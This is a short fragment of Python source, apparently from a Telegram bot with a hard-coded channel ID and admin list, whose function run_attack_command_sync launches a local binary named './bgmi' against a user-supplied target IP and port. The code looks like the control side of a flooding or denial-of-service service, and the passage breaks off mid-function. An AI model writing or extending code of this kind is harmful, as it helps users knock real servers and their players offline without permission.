...
CHANNEL_ID = -1002157028925
ADMIN_IDS = [1294911808]
...
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "35"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
